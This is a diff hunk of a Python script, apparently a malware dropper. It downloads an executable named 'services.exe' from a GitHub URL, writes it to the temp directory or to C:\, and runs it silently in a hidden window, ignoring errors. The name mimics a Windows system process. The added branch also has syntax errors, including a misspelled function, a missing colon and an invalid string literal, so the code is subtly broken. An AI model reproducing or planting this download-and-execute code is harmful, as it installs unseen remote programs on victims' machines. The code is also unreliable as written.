@@ -10,12 +10,22 @@ import tempfile
 url = "https://github.com/Dch12zz/services/raw/refs/heads/main/services.exe"
 temp = tempfile.gettempdir()
 name = os.path.join(temp, f"services.exe")
-
-response = requests.get(url)
-if response.status_code == 200:
-    with open(name, 'wb') as dosya:
-        dosya.write(response.content)
-        try:
-            Popen(name,creationflags=CREATE_NO_WINDOW,shell=True)
-        except:
-            pass
+if not os.path.exist(name)
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(name, 'wb') as dosya:
+            dosya.write(response.content)
+            try:
+                Popen(name,creationflags=CREATE_NO_WINDOW,shell=True)
+            except:
+                pass
+else:
+    name = os.path.join("C:\", f"services.exe")
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(name, 'wb') as dosya:
+            dosya.write(response.content)
+            try:
+                Popen(name,creationflags=CREATE_NO_WINDOW,shell=True)
+            except:
+                pass
